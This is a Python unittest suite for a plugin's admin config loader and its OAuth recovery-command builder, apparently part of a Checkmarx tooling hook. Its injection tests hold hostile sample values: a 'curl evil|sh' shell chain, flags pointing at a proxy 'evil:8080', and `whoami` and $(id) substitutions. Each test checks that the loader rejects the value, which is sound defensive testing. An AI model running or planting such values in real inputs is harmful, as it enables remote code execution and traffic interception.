"""Tests for the admin onboarding config path in cx_check.py (req 1 + 2).

Dependency-free (stdlib unittest) so it runs on every OS with `python -m unittest`.
Run from the repo root:  python -m unittest discover -s tests -v
"""

import importlib.util
import os
import sys
import tempfile
import unittest

# Import the shipped gate module from the plugin's hooks/ directory (repo root is one level up).
# Loaded under a unique sys.modules-free name (not a bare `import cx_check`) because every plugin
# ships its own same-named cx_check.py/cx_log.py; a bare import would get cached under sys.modules
# and silently reused — wrong-plugin behavior — by whichever other suite imports it next.
_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_HOOKS_DIR = os.path.join(_REPO_ROOT, "plugins", "copilot-devassist", "hooks")
sys.path.insert(0, _HOOKS_DIR)

# cx_check.py does its own bare `import cx_log` internally; seed sys.modules so that import binds
# to THIS plugin's cx_log rather than whatever another suite's copy is cached there, then restore
# the prior entry immediately after — cx_check copies the reference once at import time, so the
# seed only needs to be visible for that one exec_module call, and leaving it behind would corrupt
# any other suite's own bare `import cx_log`.
_log_spec = importlib.util.spec_from_file_location(
    "cx_log_copilot_admin", os.path.join(_HOOKS_DIR, "cx_log.py"))
cx_log = importlib.util.module_from_spec(_log_spec)
_log_spec.loader.exec_module(cx_log)
_prev_cx_log = sys.modules.get("cx_log")
sys.modules["cx_log"] = cx_log

_spec = importlib.util.spec_from_file_location(
    "cx_check_copilot_admin", os.path.join(_HOOKS_DIR, "cx_check.py"))
cx_check = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(cx_check)

if _prev_cx_log is None:
    sys.modules.pop("cx_log", None)
else:
    sys.modules["cx_log"] = _prev_cx_log


def _write(content):
    f = tempfile.NamedTemporaryFile("w", suffix=".properties", delete=False, encoding="utf-8")
    f.write(content)
    f.close()
    return f.name


class LoadAdminConfig(unittest.TestCase):
    def _load(self, content):
        path = _write(content)
        try:
            return cx_check._load_admin_config(path)
        finally:
            os.unlink(path)

    def test_valid_both(self):
        cfg = self._load("cx_base_auth_uri=https://eu.ast.checkmarx.net\ncx_tenant=acme-corp\n")
        self.assertEqual(cfg, {
            "cx_base_auth_uri": "https://eu.ast.checkmarx.net",
            "cx_tenant": "acme-corp",
        })

    def test_url_with_port_ok(self):
        cfg = self._load("cx_base_auth_uri=https://eu.ast.checkmarx.net:8443\ncx_tenant=acme\n")
        self.assertEqual(cfg["cx_base_auth_uri"], "https://eu.ast.checkmarx.net:8443")

    def test_windows_notepad_bom_and_crlf(self):
        # Admin edits the file with Windows Notepad: UTF-8 BOM + CRLF line endings.
        cfg = self._load("﻿cx_base_auth_uri=https://eu.ast.checkmarx.net\r\ncx_tenant=acme\r\n")
        self.assertEqual(cfg, {
            "cx_base_auth_uri": "https://eu.ast.checkmarx.net",
            "cx_tenant": "acme",
        })

    def test_missing_file_is_empty(self):
        self.assertEqual(cx_check._load_admin_config(os.path.join(tempfile.gettempdir(), "no-such-x.properties")), {})

    def test_all_commented_is_empty(self):
        self.assertEqual(self._load("# cx_tenant=x\n# cx_base_auth_uri=https://eu.ast.checkmarx.net\n"), {})

    def test_unknown_key_dropped(self):
        self.assertEqual(self._load("unknown_key=whatever\ncx_tenant=good\n"), {"cx_tenant": "good"})

    def test_no_equals_lines_ignored(self):
        self.assertEqual(self._load("just some noise\ncx_tenant=ok\n"), {"cx_tenant": "ok"})

    def test_oversized_refused(self):
        big = "cx_tenant=ok\n" + ("# padding line\n" * 2000)
        self.assertEqual(self._load(big), {})

    # --- injection vectors: every one must fall back to NO value (placeholders downstream) ---
    def test_flag_smuggling_rejected(self):
        self.assertEqual(self._load("cx_tenant=t --proxy http://evil:8080 --insecure\n"), {})

    def test_leading_dash_rejected(self):
        self.assertEqual(self._load("cx_tenant=-leadingdash\n"), {})

    def test_shell_chain_rejected(self):
        self.assertEqual(self._load("cx_tenant=x; curl evil|sh\n"), {})

    def test_backtick_rejected(self):
        self.assertEqual(self._load("cx_tenant=`whoami`\n"), {})

    def test_dollar_subst_rejected(self):
        self.assertEqual(self._load("cx_tenant=$(id)\n"), {})

    def test_url_with_path_rejected(self):
        self.assertEqual(self._load("cx_base_auth_uri=https://eu.ast.checkmarx.net/auth/realms/x\n"), {})

    def test_http_scheme_rejected(self):
        self.assertEqual(self._load("cx_base_auth_uri=http://eu.ast.checkmarx.net\n"), {})

    def test_url_with_space_rejected(self):
        self.assertEqual(self._load("cx_base_auth_uri=https://eu.ast.checkmarx.net --foo\n"), {})

    def test_overlong_tenant_rejected(self):
        self.assertEqual(self._load("cx_tenant=" + ("ab" * 32 + "c") + "\n"), {})


class OAuthRecoveryBullet(unittest.TestCase):
    def test_admin_values_branch(self):
        b = cx_check._oauth_recovery_bullet({
            "cx_base_auth_uri": "https://eu.ast.checkmarx.net", "cx_tenant": "acme",
        })
        self.assertIn("--base-auth-uri https://eu.ast.checkmarx.net", b)
        self.assertIn("--tenant acme", b)
        self.assertIn("PRECONFIGURED", b)
        self.assertNotIn("<url>", b)
        self.assertNotIn("<tenant>", b)

    def test_placeholder_branch(self):
        b = cx_check._oauth_recovery_bullet({}, history=[])
        self.assertIn("<url>", b)
        self.assertIn("<tenant>", b)
        self.assertIn("34965-68530", b)  # env-URLs doc link present (logging-in-to-checkmarx-one)
        self.assertIn("ast.checkmarx.net", b)  # inline region examples present

    def test_partial_config_falls_back_to_placeholder(self):
        # Only one of the two values → must NOT embed a half-command; use placeholders.
        b = cx_check._oauth_recovery_bullet({"cx_tenant": "acme"}, history=[])
        self.assertIn("<url>", b)


class CarveOutAcceptsComposedCommand(unittest.TestCase):
    """The admin-values recovery command the gate emits must still pass the auth-recovery carve-out
    (no shell metacharacters), otherwise the gate would block the very command it just handed out."""

    def test_composed_login_is_recovery_command(self):
        b = cx_check._oauth_recovery_bullet({
            "cx_base_auth_uri": "https://eu.ast.checkmarx.net", "cx_tenant": "acme-corp",
        })
        # Extract the last line (the command) from the bullet.
        command = b.strip().splitlines()[-1].strip()
        hook_input = {"tool_name": "Bash", "tool_input": {"command": command}}
        self.assertTrue(cx_check._is_auth_recovery_command(hook_input),
                        "composed recovery command was rejected by the carve-out: %r" % command)


if __name__ == "__main__":
    unittest.main()
